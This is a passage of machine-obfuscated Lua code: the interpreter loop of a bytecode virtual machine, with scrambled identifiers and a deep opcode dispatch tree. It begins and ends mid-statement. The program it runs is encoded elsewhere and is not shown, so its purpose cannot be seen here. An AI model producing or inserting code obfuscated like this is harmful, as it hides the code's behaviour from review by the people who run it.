n,d=h.yEJjvIKS(s,e(h.MfvIa_YJ,h.hkIXqwXy),e(h.bHhvtjCZ,h.Ri_JTlhD)+h.ExHoWgXI);e(h.ExHoWgXI);return(d*h.CnOLUWkg)+n;end;local de=true;local u=h.IyCsPjXl local function p()local o=n();local e=n();local t=h.MfvIa_YJ;local o=(d(e,h.MfvIa_YJ,h.JWgCxqLV)*(h.ExHoWgXI^h.jahzBWWX))+o;local n=d(e,h.glnajEmx,h.yEeGHaRS);local e=((-h.MfvIa_YJ)^d(e,h.jahzBWWX));if(n==h.IyCsPjXl)then if(o==u)then return e*h.IyCsPjXl;else n=h.MfvIa_YJ;t=h.IyCsPjXl;end;elseif(n==h.SuHAEAJV)then return(o==h.IyCsPjXl)and(e*(h.MfvIa_YJ/h.IyCsPjXl))or(e*(h.IyCsPjXl/h.IyCsPjXl));end;return h.tmbDmaVW(e,n-h.MOCWLTPB)*(t+(o/(h.ExHoWgXI^h.XtfoLFHa)));end;local c=n;local function _(n)local d;if(not n)then n=c();if(n==h.IyCsPjXl)then return'';end;end;d=h.YcEWIb_W(s,e(h.MfvIa_YJ,h.hkIXqwXy),e(h.bHhvtjCZ,h.Ri_JTlhD)+n-h.MfvIa_YJ);e(n)local e=""for n=(h.MfvIa_YJ+u),#d do e=e..h.YcEWIb_W(d,n,n)end return e;end;local u=#h.xdznpgjm(k('\49.\48'))~=h.MfvIa_YJ local e=n;local function te(...)return{...},h.eTsToHUS('#',...)end local function oe()local r={};local s={};local e={};local k={s,r,nil,e};local e=n()local f={}for o=h.MfvIa_YJ,e do local d=a();local n;if(d==h.MfvIa_YJ)then n=(a()~=#{});elseif(d==h.ExHoWgXI)then local e=p();if u and h.kVxFycTG(h.xdznpgjm(e),'.(\48+)$')then e=h.pUWGgmZh(e);end n=e;elseif(d==h.IyCsPjXl)then n=_();end;f[o]=n;end;for e=h.MfvIa_YJ,n()do r[e-(#{h.MfvIa_YJ})]=oe();end;k[h.hkIXqwXy]=a();for k=h.MfvIa_YJ,n()do local e=a();if(d(e,h.MfvIa_YJ,h.MfvIa_YJ)==h.IyCsPjXl)then local r=d(e,h.ExHoWgXI,h.hkIXqwXy);local a=d(e,h.apEXLEaR,h.Ri_JTlhD);local e={l(),l(),nil,nil};if(r==h.IyCsPjXl)then e[t]=l();e[b]=l();elseif(r==#{h.MfvIa_YJ})then e[t]=n();elseif(r==y[h.ExHoWgXI])then e[t]=n()-(h.ExHoWgXI^h.upMkhkHv)elseif(r==y[h.hkIXqwXy])then e[t]=n()-(h.ExHoWgXI^h.upMkhkHv)e[b]=l();end;if(d(a,h.MfvIa_YJ,h.MfvIa_YJ)==h.MfvIa_YJ)then e[o]=f[e[o]]end if(d(a,h.ExHoWgXI,h.ExHoWgXI)==h.MfvIa_YJ)then e[t]=f[e[t]]end if(d(a,h.hkIXqwXy,h.hkIXqwXy)==h.MfvIa_YJ)then e[b]=f[e[b]]end s[k]=e;end end;return k;end;local function le(d,n,e)local o=n;local o=e;return k(h.kVxFycTG(h.kVxFycTG(({h.aPzAlgik(d)})[h.ExHoWgXI],n),e))end local function p(j,s,a)local function oe(...)local l,g,_,ne,y,n,k,c,ee,m,u,d;local e=h.IyCsPjXl;while-h.MfvIa_YJ<e do if e>h.ExHoWgXI then if e>=h.bHhvtjCZ then if h.ExHoWgXI<e then repeat if e~=h.bHhvtjCZ then e=-h.ExHoWgXI;break;end;d=f(h.GDQkQhGT);until true;else e=-h.ExHoWgXI;end else if e~=h.MfvIa_YJ then for n=h.YQDFXxpd,h.DcdEqDJO do if h.apEXLEaR~=e then c={};ee={...};break;end;m=h.eTsToHUS('#',...)-h.MfvIa_YJ;u={};break;end;else m=h.eTsToHUS('#',...)-h.MfvIa_YJ;u={};end end else if h.MfvIa_YJ>e then l=f(h.Ri_JTlhD,h.OYglEaHZ,h.MfvIa_YJ,h.IUGZifiw,j);g=f(h.Ri_JTlhD,h.qEmKYGIf,h.ExHoWgXI,h.tTq_B_DH,j);else if e~=-h.MfvIa_YJ then repeat if h.ExHoWgXI>e then _=f(h.Ri_JTlhD,h.rEBlRKWq,h.hkIXqwXy,h.GDQkQhGT,j);y=te ne=h.IyCsPjXl;break;end;n=-h.oborkHDh;k=-h.MfvIa_YJ;until true;else _=f(h.Ri_JTlhD,h.rEBlRKWq,h.hkIXqwXy,h.GDQkQhGT,j);y=te ne=h.IyCsPjXl;end end end e=e+h.MfvIa_YJ;end;for e=h.IyCsPjXl,m do if(e>=_)then c[e-_]=ee[e+h.MfvIa_YJ];else d[e]=ee[e+h.MfvIa_YJ];end;end;local _=m-_+h.MfvIa_YJ local e;local f;function rdUGMrbxPhem()de=false;end;local function j(...)while true do end end while de do if n<-h.HGolXrCW then n=n+h.frwzRCbV end e=l[n];f=e[z];if h.WBsnJKsy<f then if h.oskpcXrL>=f then if h._osZLPpZ<=f then if f>=116 then if f>=121 then if f>=124 then if f<=124 then local k,a,s,h,r,f;d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];d[e[o]][d[e[t]]]=d[e[b]];n=n+1;e=l[n];do return d[e[o]]end n=n+1;e=l[n];k=e[o];a={};for e=1,#u do s=u[e];for e=0,#s do h=s[e];r=h[1];f=h[2];if r==d and f>=k then a[f]=r[f];h[1]=a;end;end;end;else if 126>f then local h;for f=0,6 do if f>=3 then if 4>=f then if 1~=f then for h=22,79 do if 4~=f then d[e[o]]={};n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;else d[e[o]]=d[e[t]];n=n+1;e=l[n];end else if f>=1 then for h=32,96 do if 6~=f then d(e[o],e[t]);n=n+1;e=l[n];break;end;d(e[o],e[t]);break;end;else d(e[o],e[t]);end end else if 1>f then d(e[o],e[t]);n=n+1;e=l[n];else if 0~=f then for b=13,61 do if 2>f then d(e[o],e[t]);n=n+1;e=l[n];break;end;h=e[o]d[h]=d[h](r(d,h+1,e[t]))n=n+1;e=l[n];break;end;else d(e[o],e[t]);n=n+1;e=l[n];end end end end else do return end;end end else if 122>f then for e=e[o],e[t]do d[e]=nil;end;else if f~=119 then repeat if 123~=f then local f,r,a;for h=0,4 do if 2>h then if h>-4 then for f=24,84 do if 0<h then d(e[o],e[t]);n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];break;end;else d(e[o],e[t]);n=n+1;e=l[n];end else if 2>=h then d[e[o]]=#d[e[t]];n=n+1;e=l[n];else if 2<h then repeat if h<4 then d(e[o],e[t]);n=n+1;e=l[n];break;end;f=e[o];r=d[f]a=d[f+2];if(a>0)then if(r>d[f+1])then n=e[t];else d[f+3]=r;end elseif(r<d[f+1])then n=e[t];else d[f+3]=r;end until true;else d(e[o],e[t]);n=n+1;e=l[n];end end end end break;end;local h;for f=0,6 do if 3>f then if 0>=f then h=e[o]d[h]=d[h](r(d,h+1,e[t]))n=n+1;e=l[n];else if f>=-3 then for h=44,70 do if 2>f then d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;d(e[o],e[t]);n=n+1;e=l[n];break;end;else d(e[o],e[t]);n=n+1;e=l[n];end end else if 4<f then if f>=4 then repeat if 6>f then d(e[o],e[t]);n=n+1;e=l[n];break;end;d(e[o],e[t]);until true;else d(e[o],e[t]);end else if 2<f then repeat if f~=3 then d(e[o],e[t]);n=n+1;e=l[n];break;end;d(e[o],e[t]);n=n+1;e=l[n];until true;else d(e[o],e[t]);n=n+1;e=l[n];end end end end until true;else local h;for f=0,6 do if 3>f then if 0>=f then h=e[o]d[h]=d[h](r(d,h+1,e[t]))n=n+1;e=l[n];else if f>=-3 then for h=44,70 do if 2>f then d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;d(e[o],e[t]);n=n+1;e=l[n];break;end;else d(e[o],e[t]);n=n+1;e=l[n];end end else if 4<f then if f>=4 then repeat if 6>f then d(e[o],e[t]);n=n+1;e=l[n];break;end;d(e[o],e[t]);until true;else d(e[o],e[t]);end else if 2<f then repeat if f~=3 then d(e[o],e[t]);n=n+1;e=l[n];break;end;d(e[o],e[t]);n=n+1;e=l[n];until true;else d(e[o],e[t]);n=n+1;e=l[n];end end end end end end end else if f>117 then if 118<f then if f>=118 then for h=39,96 do if f>119 then local o=e[o];local l=d[o]local f=d[o+2];if(f>0)then if(l>d[o+1])then n=e[t];else d[o+3]=l;end elseif(l<d[o+1])then n=e[t];else d[o+3]=l;end break;end;local h;for f=0,6 do if 2>=f then if f<=0 then d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];else if-3~=f then for h=23,91 do if f~=2 then d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];break;end;else d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];end end else if f<=4 then if f~=-1 then repeat if 4~=f then h=e[o]d[h]=d[h](d[h+1])n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];until true;else h=e[o]d[h]=d[h](d[h+1])n=n+1;e=l[n];end else if 1<=f then repeat if 6>f then d[e[o]]=#d[e[t]];n=n+1;e=l[n];break;end;if(d[e[o]]==e[b])then n=n+1;else n=e[t];end;until true;else if(d[e[o]]==e[b])then n=n+1;else n=e[t];end;end end end end break;end;else local h;for f=0,6 do if 2>=f then if f<=0 then d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];else if-3~=f then for h=23,91 do if f~=2 then d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];break;end;else d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];end end else if f<=4 then if f~=-1 then repeat if 4~=f then h=e[o]d[h]=d[h](d[h+1])n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];until true;else h=e[o]d[h]=d[h](d[h+1])n=n+1;e=l[n];end else if 1<=f then repeat if 6>f then d[e[o]]=#d[e[t]];n=n+1;e=l[n];break;end;if(d[e[o]]==e[b])then n=n+1;else n=e[t];end;until true;else if(d[e[o]]==e[b])then n=n+1;else n=e[t];end;end end end end end else local f,l,r,b,h;local n=0;while n>-1 do if 3<=n then if n>=5 then if 5<n then n=-2;else d(h,b);end else if-1~=n then repeat if 4~=n then b=f[r];break;end;h=f[l];until true;else h=f[l];end end else if 1>n then f=e;else if-3<=n then repeat if 2>n then l=o;break;end;r=t;until true;else l=o;end end end n=n+1 end end else if f~=112 then repeat if f<117 then a[e[t]]=d[e[o]];break;end;d[e[o]]=d[e[t]][e[b]];until true;else d[e[o]]=d[e[t]][e[b]];end end end else if f<=110 then if 108>f then if 102<f then repeat if 106~=f then if(e[o]<d[e[b]])then n=n+1;else n=e[t];end;break;end;local t,b,f;for r=0,1 do if r~=-4 then for a=37,71 do if 1>r then t=e[o];k=t+_-1;for e=t,k do b=c[e-t];d[e]=b;end;n=n+1;e=l[n];break;end;t=e[o];f=d[t];for e=t+1,k do h.RwVvSOGQ(f,d[e])end;break;end;else t=e[o];f=d[t];for e=t+1,k do h.RwVvSOGQ(f,d[e])end;end end until true;else local t,r,f;for b=0,1 do if b~=-4 then for a=37,71 do if 1>b then t=e[o];k=t+_-1;for e=t,k do r=c[e-t];d[e]=r;end;n=n+1;e=l[n];break;end;t=e[o];f=d[t];for e=t+1,k do h.RwVvSOGQ(f,d[e])end;break;end;else t=e[o];f=d[t];for e=t+1,k do h.RwVvSOGQ(f,d[e])end;end end end else if f<=108 then local k=g[e[t]];local r;local f={};r=h.mzMmfqtV({},{__index=function(n,e)local e=f[e];return e[1][e[2]];end,__newindex=function(d,e,n)local e=f[e]e[1][e[2]]=n;end;});for o=1,e[b]do n=n+1;local e=l[n];if e[z]==41 then f[o-1]={d,e[t]};else f[o-1]={s,e[t]};end;u[#u+1]=f;end;d[e[o]]=p(k,r,a);else if 107~=f then repeat if 109<f then d[e[o]]=#d[e[t]];break;end;d[e[o]][d[e[t]]]=d[e[b]];until true;else d[e[o]]=#d[e[t]];end end end else if 113>f then if f>=110 then for h=11,66 do if 112~=f then local a,p,h,k,c,u,y,s,f;for f=0,5 do if 2>=f then if f>0 then if 1==f then f=0;while f>-1 do if 4>f then if f>=2 then if 3>f then c=t;else u=d;end else if f>=-2 then for n=24,97 do if f<1 then h=e;break;end;k=o;break;end;else h=e;end end else if 6<=f then if 6~=f then f=-2;else d[s]=y;end else if 3<f then repeat if 4~=f then s=h[k];break;end;y=u[h[c]];until true;else s=h[k];end end end f=f+1 end n=n+1;e=l[n];else f=0;while f>-1 do if f>3 then if 5>=f then if 2<=f then for e=25,63 do if 5~=f then y=u[h[c]];break;end;s=h[k];break;end;else y=u[h[c]];end else if 5<f then repeat if f~=7 then d[s]=y;break;end;f=-2;until true;else d[s]=y;end end else if 1<f then if 1~=f then repeat if f>2 then u=d;break;end;c=t;until true;else u=d;end else if-2~=f then repeat if 1~=f then h=e;break;end;k=o;until true;else k=o;end end end f=f+1 end n=n+1;e=l[n];end else a=e[o];p=d[e[t]];d[a+1]=p;d[a]=p[e[b]];n=n+1;e=l[n];end else if f<4 then a=e[o]d[a]=d[a](r(d,a+1,e[t]))n=n+1;e=l[n];else if 3~=f then repeat if 5>f then d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]]*e[b];until true;else d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];end end end end break;end;local o=e[o];local f=d[o+2];local l=d[o]+f;d[o]=l;if(f>0)then if(l<=d[o+1])then n=e[t];d[o+3]=l;end elseif(l>=d[o+1])then n=e[t];d[o+3]=l;end break;end;else local a,p,h,u,c,k,y,s,f;for f=0,5 do if 2>=f then if f>0 then if 1==f then f=0;while f>-1 do if 4>f then if f>=2 then if 3>f then c=t;else k=d;end else if f>=-2 then for n=24,97 do if f<1 then h=e;break;end;u=o;break;end;else h=e;end end else if 6<=f then if 6~=f then f=-2;else d[s]=y;end else if 3<f then repeat if 4~=f then s=h[u];break;end;y=k[h[c]];until true;else s=h[u];end end end f=f+1 end n=n+1;e=l[n];else f=0;while f>-1 do if f>3 then if 5>=f then if 2<=f then for e=25,63 do if 5~=f then y=k[h[c]];break;end;s=h[u];break;end;else y=k[h[c]];end else if 5<f then repeat if f~=7 then d[s]=y;break;end;f=-2;until true;else d[s]=y;end end else if 1<f then if 1~=f then repeat if f>2 then k=d;break;end;c=t;until true;else k=d;end else if-2~=f then repeat if 1~=f then h=e;break;end;u=o;until true;else u=o;end end end f=f+1 end n=n+1;e=l[n];end else a=e[o];p=d[e[t]];d[a+1]=p;d[a]=p[e[b]];n=n+1;e=l[n];end else if f<4 then a=e[o]d[a]=d[a](r(d,a+1,e[t]))n=n+1;e=l[n];else if 3~=f then repeat if 5>f then d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]]*e[b];until true;else d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];end end end end end else if f<114 then local f,a;for b=0,2 do if b<=0 then d(e[o],e[t]);n=n+1;e=l[n];else if b>-1 then repeat if b<2 then f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];break;end;f=e[o];a=d[f];for e=f+1,e[t]do h.RwVvSOGQ(a,d[e])end;until true;else f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];end end end else if f~=112 then repeat if 115>f then local h,f,r,k,s,u,a,y,c;local l=0;while l>-1 do if 3>l then if l<1 then h=d;else if 1<l then k=f[o];s=f[b];u=t;else f=e;r=n;end end else if l>=5 then if l>5 then l=-2;else n=c;end else if l==3 then a=h[k];y=h[s];else c=a==y and f[u]or 1+r;end end end l=l+1 end break;end;local f,h,b;for r=0,2 do if r>0 then if r>-3 then repeat if 2>r then d(e[o],e[t]);n=n+1;e=l[n];break;end;f=e[o];h=d[f]b=d[f+2];if(b>0)then if(h>d[f+1])then n=e[t];else d[f+3]=h;end elseif(h<d[f+1])then n=e[t];else d[f+3]=h;end until true;else f=e[o];h=d[f]b=d[f+2];if(b>0)then if(h>d[f+1])then n=e[t];else d[f+3]=h;end elseif(h<d[f+1])then n=e[t];else d[f+3]=h;end end else d[e[o]]=#d[e[t]];n=n+1;e=l[n];end end until true;else local f,h,b;for r=0,2 do if r>0 then if r>-3 then repeat if 2>r then d(e[o],e[t]);n=n+1;e=l[n];break;end;f=e[o];h=d[f]b=d[f+2];if(b>0)then if(h>d[f+1])then n=e[t];else d[f+3]=h;end elseif(h<d[f+1])then n=e[t];else d[f+3]=h;end until true;else f=e[o];h=d[f]b=d[f+2];if(b>0)then if(h>d[f+1])then n=e[t];else d[f+3]=h;end elseif(h<d[f+1])then n=e[t];else d[f+3]=h;end end else d[e[o]]=#d[e[t]];n=n+1;e=l[n];end end end end end end end else if f>94 then if f<100 then if 96>=f then if f==96 then local h;for f=0,6 do if f>2 then if 4>=f then if-1<=f then repeat if f~=4 then d[e[o]]=s[e[t]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];until true;else d[e[o]]=s[e[t]];n=n+1;e=l[n];end else if f>2 then for b=35,92 do if 5~=f then h=e[o]d[h](r(d,h+1,e[t]))break;end;d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;else d[e[o]]=d[e[t]];n=n+1;e=l[n];end end else if 0>=f then d[e[o]][e[t]]=d[e[b]];n=n+1;e=l[n];else if-3<=f then repeat if 1~=f then d[e[o]]=a[e[t]];n=n+1;e=l[n];break;end;h=e[o]d[h]=d[h](r(d,h+1,e[t]))n=n+1;e=l[n];until true;else d[e[o]]=a[e[t]];n=n+1;e=l[n];end end end end else d[e[o]]=d[e[t]]+e[b];end else if f<=97 then local e=e[o];do return r(d,e,k)end;else if 97<=f then repeat if 98<f then local n=e[o]d[n](r(d,n+1,e[t]))break;end;local f,a;for h=0,6 do if h>2 then if h>4 then if h==6 then d[e[o]]=d[e[t]];else f=e[o];a=d[e[t]];d[f+1]=a;d[f]=a[e[b]];n=n+1;e=l[n];end else if h==3 then f=e[o]d[f]=d[f](r(d,f+1,e[t]))n=n+1;e=l[n];else d[e[o]][d[e[t]]]=d[e[b]];n=n+1;e=l[n];end end else if h>0 then if-2<h then for f=48,93 do if 1~=h then d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;d[e[o]]=d[e[t]];n=n+1;e=l[n];break;end;else d[e[o]]=d[e[t]];n=n+1;e=l[n];end else f=e[o];a=d[e[t]];d[f+1]=a;d[f]=a[e[b]];n=n+1;e=l[n];end end end until true;else local n=e[o]d[n](r(d,n+1,e[t]))end end end else if 102<f then if f>103 then if f>100 then repeat if f~=104 then d[e[o]]=d[e[t]]%e[b];break;end;d[e[o]]=d[e[t]]*e[b];until true;else d[e[o]]=d[e[t]]*e[b];end else d[e[o]]=a[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];d[e[o]]={};end else if f>100 then if 100~=f then repeat if f>101 then for f=0,1 do if 1>f then d[e[o]]=a[e[t]];n=n+1;e=l[n];else if d[e[o]]then n=n+1;else n=e[t];end;end end break;end;local g,g,g,c,_,g,f,y,k,p,h,a,u,r;d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];d[e[o]]=d[e[t]]+d[e[b]];n=n+1;e=l[n];f=0;while f>-1 do if 4<=f then if 5>=f then if f~=5 then _=c[h[k]];else u=h[y];end else if f<7 then d[u]=_;else f=-2;end end else if 1<f then if f>0 then for e=41,86 do if 3>f then k=t;break;end;c=d;break;end;else c=d;end else if-2~=f then for n=19,94 do if 0<f then y=o;break;end;h=e;break;end;else h=e;end end end f=f+1 end n=n+1;e=l[n];d[e[o]]=s[e[t]];n=n+1;e=l[n];d[e[o]]=d[e[t]]%e[b];n=n+1;e=l[n];d[e[o]]=d[e[t]][d[e[b]]];n=n+1;e=l[n];f=0;while f>-1 do if 3<=f then if 5<=f then if f>=2 then repeat if f~=5 then f=-2;break;end;d[u]=r;until true;else f=-2;end else if f~=0 then for e=41,87 do if 4>f then u=h[y];break;end;r=d[a];for e=1+a,h[p]do r=r..d[e];end;break;end;else r=d[a];for e=1+a,h[p]do r=r..d[e];end;end end else if f<1 then y=o;k=t;p=b;else if 0~=f then repeat if 1<f then a=h[k];break;end;h=e;until true;else a=h[k];end end end f=f+1 end until true;else for f=0,1 do if 1>f then d[e[o]]=a[e[t]];n=n+1;e=l[n];else if d[e[o]]then n=n+1;else n=e[t];end;end end end else local e=e[o];local n=d[e];for e=e+1,k do h.RwVvSOGQ(n,d[e])end;end end end else if f<90 then if 86>=f then if 82~=f then for h=47,90 do if f>85 then local s,f,k,h,r,a,c,y,u;local l=0;while l>-1 do if 2<l then if l<=4 then if l~=3 then u=c==y and f[a]or 1+k;else c=s[h];y=s[r];end else if l>5 then l=-2;else n=u;end end else if l<=0 then s=d;else if l>-2 then repeat if 2~=l then f=e;k=n;break;end;h=f[o];r=f[b];a=t;until true;else h=f[o];r=f[b];a=t;end end end l=l+1 end break;end;d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];d[e[o]]=d[e[t]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];do return end;break;end;else local h,f,c,r,a,s,k,u,y;local l=0;while l>-1 do if 2<l then if l<=4 then if l~=3 then y=k==u and f[s]or 1+c;else k=h[r];u=h[a];end else if l>5 then l=-2;else n=y;end end else if l<=0 then h=d;else if l>-2 then repeat if 2~=l then f=e;c=n;break;end;r=f[o];a=f[b];s=t;until true;else r=f[o];a=f[b];s=t;end end end l=l+1 end end else if f>87 then if 88<f then local o=e[o];local n=d[e[t]];d[o+1]=n;d[o]=n[e[b]];else local n=e[o];do return d[n](r(d,n+1,e[t]))end;end else local f,s,a,r,f,f,h,k,u,c,y,b;for f=0,6 do if f<3 then if f>=1 then if 1<f then f=0;while f>-1 do if 3<f then if f>5 then if 2~=f then repeat if f~=7 then d[b]=y;break;end;f=-2;until true;else f=-2;end else if 1~=f then repeat if 5~=f then y=c[h[u]];break;end;b=h[k];until true;else b=h[k];end end else if f<=1 then if f==0 then h=e;else k=o;end else if 2~=f then c=d;else u=t;end end end f=f+1 end n=n+1;e=l[n];else f=0;while f>-1 do if f<3 then if f>0 then if-2<=f then repeat if 1~=f then a=t;break;end;s=o;until true;else s=o;end else h=e;end else if f>=5 then if f~=3 then for e=32,94 do if 6>f then d(b,r);break;end;f=-2;break;end;else d(b,r);end else if f>=1 then for e=40,71 do if 3~=f then b=h[s];break;end;r=h[a];break;end;else b=h[s];end end end f=f+1 end n=n+1;e=l[n];end else d[e[o]]={};n=n+1;e=l[n];end else if 4<f then if f>2 then for k=30,72 do if 5~=f then f=0;while f>-1 do if 3>f then if f>=1 then if 0<=f then for e=49,70 do if 1~=f then a=t;break;end;s=o;break;end;else a=t;end else h=e;end else if f<5 then if f~=1 then repeat if f~=3 then b=h[s];break;end;r=h[a];until true;else r=h[a];end else if f>3 then for e=37,92 do if f~=6 then d(b,r);break;end;f=-2;break;end;else d(b,r);end end end f=f+1 end break;end;f=0;while f>-1 do if 3>f then if f>=1 then if f~=-1 then repeat if f~=1 then a=t;break;end;s=o;until true;else a=t;end else h=e;end else if f<=4 then if f>=1 then for e=13,63 do if 3~=f then b=h[s];break;end;r=h[a];break;end;else r=h[a];end else if 1<=f then for e=37,60 do if f>5 then f=-2;break;end;d(b,r);break;end;else d(b,r);end end end f=f+1 end n=n+1;e=l[n];break;end;else f=0;while f>-1 do if 3>f then if f>=1 then if 0<=f then for e=49,70 do if 1~=f then a=t;break;end;s=o;break;end;else a=t;end else h=e;end else if f<5 then if f~=1 then repeat if f~=3 then b=h[s];break;end;r=h[a];until true;else r=h[a];end else if f>3 then for e=37,92 do if f~=6 then d(b,r);break;end;f=-2;break;end;else d(b,r);end end end f=f+1 end end else if f~=0 then for k=11,53 do if 3~=f then f=0;while f>-1 do if f<=2 then if 0<f then if f~=2 then s=o;else a=t;end else h=e;end else if 5>f then if-1~=f then repeat if f>3 then b=h[s];break;end;r=h[a];until true;else b=h[s];end else if f~=4 then repeat if 5<f then f=-2;break;end;d(b,r);until true;else f=-2;end end end f=f+1 end n=n+1;e=l[n];break;end;f=0;while f>-1 do if 3>f then if 1>f then h=e;else if-1~=f then for e=32,58 do if 1~=f then a=t;break;end;s=o;break;end;else s=o;end end else if 5<=f then if 1<=f then repeat if 5<f then f=-2;break;end;d(b,r);until true;else d(b,r);end else if 3==f then r=h[a];else b=h[s];end end end f=f+1 end n=n+1;e=l[n];break;end;else f=0;while f>-1 do if f<=2 then if 0<f then if f~=2 then s=o;else a=t;end else h=e;end else if 5>f then if-1~=f then repeat if f>3 then b=h[s];break;end;r=h[a];until true;else b=h[s];end else if f~=4 then repeat if 5<f then f=-2;break;end;d(b,r);until true;else f=-2;end end end f=f+1 end n=n+1;e=l[n];end end end end end end else if f<=91 then if 90==f then local e=e[o];local n=d[e];for e=e+1,k do h.RwVvSOGQ(n,d[e])end;else d[e[o]]=s[e[t]];end else if 92<f then if f~=94 then local h,s,k,u,r,a,f;d[e[o]]=d[e[t]][e[b]];n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];f=0;while f>-1 do if 3<f then if f<6 then if 5>f then r=u[h[k]];else a=h[s];end else if f>=5 then repeat if 7>f then d[a]=r;break;end;f=-2;until true;else d[a]=r;end end else if 1>=f then if 1~=f then h=e;else s=o;end else if 3~=f then k=t;else u=d;end end end f=f+1 end n=n+1;e=l[n];d[e[o]]();n=n+1;e=l[n];do return end;else local k=g[e[t]];local r;local f={};r=h.mzMmfqtV({},{__index=function(n,e)local e=f[e];return e[1][e[2]];end,__newindex=function(d,e,n)local e=f[e]e[1][e[2]]=n;end;});for o=1,e[b]do n=n+1;local e=l[n];if e[z]==41 then f[o-1]={d,e[t]};else f[o-1]={s,e[t]};end;u[#u+1]=f;end;d[e[o]]=p(k,r,a);end else local g,k,s,a,g,f,u,h,_,p,c,y,b;f=0;while f>-1 do if 2>=f then if 0<f then if-3<=f then for e=47,58 do if f>1 then s=t;break;end;k=o;break;end;else k=o;end else h=e;end else if f<5 then if f>=-1 then for e=14,70 do if f<4 then a=h[s];break;end;b=h[k];break;end;else a=h[s];end else if f~=6 then d(b,a);else f=-2;end end end f=f+1 end n=n+1;e=l[n];f=0;while f>-1 do if f<3 then if f>0 then if f~=-3 then repeat if f~=2 then k=o;break;end;s=t;until true;else s=t;end else h=e;end else if 4>=f then if 0~=f then repeat if f>3 then b=h[k];break;end;a=h[s];until true;else a=h[s];end else if 2<=f then repeat if f<6 then d(b,a);break;end;f=-2;until true;else d(b,a);end end end f=f+1 end n=n+1;e=l[n];f=0;while f>-1 do if 3<=f then if 5<=f then if f>1 then repeat if 5<f then f=-2;break;end;d(b,a);until true;else d(b,a);end else if f==3 then a=h[s];else b=h[k];end end else if 0<f then if 2>f then k=o;else s=t;end else h=e;end end f=f+1 end n=n+1;e=l[n];f=0;while f>-1 do if 3>f then if 1<=f then if f>=-2 then for e=46,87 do if 2~=f then k=o;break;end;s=t;break;end;else k=o;end else h=e;end else if f>4 then if 2<=f then repeat if 5<f then f=-2;break;end;d(b,a);until true;else d(b,a);end else if f>=1 then for e=44,80 do if 3~=f then b=h[k];break;end;a=h[s];break;end;else b=h[k];end end end f=f+1 end n=n+1;e=l[n];u=e[o]d[u]=d[u](r(d,u+1,e[t]))n=n+1;e=l[n];f=0;while f>-1 do if f<4 then if 2<=f then if f>2 then c=d;else p=t;end else if f>0 then _=o;else h=e;end end else if f<=5 then if 2<f then repeat if f~=4 then b=h[_];break;end;y=c[h[p]];until true;else y=c[h[p]];end else if f>5 then repeat if f~=6 then f=-2;break;end;d[b]=y;until true;else f=-2;end end end f=f+1 end n=n+1;e=l[n];f=0;while f>-1 do if 2<f then if f<=4 then if f==3 then a=h[s];else b=h[k];end else if 5<f then f=-2;else d(b,a);end end else if f<=0 then h=e;else if-2<f then for e=30,69 do if f~=2 then k=o;break;end;s=t;break;end;else s=t;end end end f=f+1 end end end end end end else if f<148 then if f>136 then if f>=142 then if 145>f then if f<=142 then local e=e[o]local o,n=y(d[e](d[e+1]))k=n+e-1 local n=0;for e=e,k do n=n+1;d[e]=o[n];end;else if f>=140 then for h=11,54 do if f<144 then local r,s,k,u,a,f,h,b,y;for f=0,2 do if 0>=f then d[e[o]]=#d[e[t]];n=n+1;e=l[n];else if 1<f then h=e[o];b=d[h]y=d[h+2];if(y>0)then if(b>d[h+1])then n=e[t];else d[h+3]=b;end elseif(b<d[h+1])then n=e[t];else d[h+3]=b;end else f=0;while f>-1 do if 3>f then if f>0 then if-3<=f then for e=32,73 do if f~=1 then k=t;break;end;s=o;break;end;else k=t;end else r=e;end else if f<=4 then if f>=1 then for e=18,55 do if 4>f then u=r[k];break;end;a=r[s];break;end;else a=r[s];end else if 3<=f then for e=37,98 do if f~=6 then d(a,u);break;end;f=-2;break;end;else d(a,u);end end end f=f+1 end n=n+1;e=l[n];end end end break;end;d[e[o]]=a[e[t]];break;end;else d[e[o]]=a[e[t]];end end else if f>145 then if f==146 then local n=e[o];do return d[n](r(d,n+1,e[t]))end;else local f,a,y,h,s,b;f=e[o];do return 